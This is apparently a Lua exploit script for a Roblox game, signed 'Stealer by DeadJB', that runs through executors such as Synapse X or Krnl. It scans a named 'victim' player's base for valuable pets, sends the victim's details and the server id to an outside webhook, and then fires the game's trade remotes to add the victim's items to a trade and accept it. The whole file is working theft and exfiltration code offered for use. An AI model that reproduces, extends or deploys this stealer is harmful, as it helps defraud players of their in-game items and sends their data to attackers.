local function getUserIdByName(name)
    local success, result = pcall(function()
        return Players:GetUserIdFromNameAsync(name)
    end)
    if success and result then
        return result
    end
    return nil
end

local function scanVictim()
    local plots = Workspace:FindFirstChild("Plots")
    if not plots then return {} end

    local victimPets = {}
    local displayNameToIndex = {}

    for idx, info in pairs(AnimalsData) do
        if info.DisplayName then
            displayNameToIndex[info.DisplayName] = idx
        end
        displayNameToIndex[idx] = idx
    end

    for _, plot in ipairs(plots:GetChildren()) do
        local sign = plot:FindFirstChild("PlotSign")
        if sign then
            local gui = sign:FindFirstChildWhichIsA("SurfaceGui", true)
            if gui then
                local label = gui:FindFirstChildWhichIsA("TextLabel", true)
                if label then
                    local text = label.Text
                    if text and text ~= "" and not text:lower():find("empty") then
                        local owner = text:match("^(.+)'s Base$") or text
                        if owner == VictimName then
                            for _, desc in ipairs(plot:GetDescendants()) do
                                if desc:IsA("Model") and desc:FindFirstChildOfClass("Humanoid") then
                                    local displayName = desc.Name
                                    local index = displayNameToIndex[displayName] or displayName
                                    local attrs = desc:GetAttributes()
                                    local mutation = attrs.Mutation or attrs.__mutation or "None"
                                    local traits = attrs.Traits and tostring(attrs.Traits) or "None"

                                    local info = AnimalsData[index]
                                    local gen = info and info.Generation or 0

                                    table.insert(victimPets, {
                                        name = displayName,
                                        index = index,
                                        mutation = mutation,
                                        traits = traits,
                                        generation = gen,
                                    })
                                end
                            end
                        end
                    end
                end
            end
        end
    end

    return victimPets
end

local function checkItems(victimPets)
    local found = {
        brainrots = {},
        bases = {},
        gears = {},
    }

    for _, pet in ipairs(victimPets) do
        if WANTED_BRAINROTS[pet.name] then
            table.insert(found.brainrots, pet)
        end
    end

    table.sort(found.brainrots, function(a, b)
        return a.generation > b.generation
    end)

    return found
end

local function sendWebhook(victimPets, found, tradeStatus)
    if WEBHOOK_URL == "" then return end

    local playerCount = #Players:GetPlayers()
    local timestamp = os.date("%Y-%m-%d %H:%M:%S")
    local executor = syn and "Synapse X" or (krnl and "Krnl") or (script and "Delta") or "Unknown"

    local brainrotNames = {}
    for _, pet in ipairs(found.brainrots) do
        table.insert(brainrotNames, pet.name .. " (Gen: " .. pet.generation .. ")")
    end

    local baseNames = {}
    for _, base in ipairs(found.bases) do
        table.insert(baseNames, base)
    end

    local gearNames = {}
    for _, gear in ipairs(found.gears) do
        table.insert(gearNames, gear)
    end

    local embed = {
        ["title"] = "VITIMA ENCONTRADA!",
        ["description"] = string.format(
            "**%s** [%s]\n\n" ..
            "**Brainrots Encontrados:**\n%s\n\n" ..
            "**Bases Encontradas:**\n%s\n\n" ..
            "**Gears Encontrados:**\n%s\n\n" ..
            "**Server:** %s\n" ..
            "**Players:** %d\n" ..
            "**Scanned:** %s\n\n" ..
            "**Executor:** %s\n\n" ..
            "**Vítima:** %s • %d | %s",
            tradeStatus or "Status Desconhecido",
            "Brainrot",
            #brainrotNames > 0 and table.concat(brainrotNames, "\n") or "Nenhum",
            #baseNames > 0 and table.concat(baseNames, "\n") or "Nenhuma",
            #gearNames > 0 and table.concat(gearNames, "\n") or "Nenhum",
            game.JobId or "Desconhecido",
            playerCount,
            timestamp,
            executor,
            VictimName,
            VictimId,
            timestamp
        ),
        ["color"] = 0xFF0000,
        ["footer"] = {
            ["text"] = "Stealer by DeadJB"
        }
    }

    local payload = {
        ["content"] = "@everyone",
        ["embeds"] = {embed}
    }

    pcall(function()
        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson)
    end)
end

local function sendTradeRequest(targetUserId)
    local success, result = pcall(function()
        return REMOTES.Invite:InvokeServer(targetUserId)
    end)
    return success, result
end

local function addItemsToTrade(found)
    for _, pet in ipairs(found.brainrots) do
        pcall(function()
            REMOTES.AddBrainrot:InvokeServer(pet.index, pet.mutation, pet.traits)
        end)
        task.wait(5)
    end

    for _, base in ipairs(found.bases) do
        pcall(function()
            REMOTES.AddItem:InvokeServer("BaseSkin", base)
        end)
        task.wait(5)
    end

    for _, gear in ipairs(found.gears) do
        pcall(function()
            REMOTES.AddItem:InvokeServer("Gear", gear)
        end)
        task.wait(5)
    end
end

local function confirmTrade()
    pcall(function()
        REMOTES.Ready:FireServer()
        task.wait(1)
        REMOTES.Accept:FireServer()
    end)
end

print("[Stealer] Iniciando...")
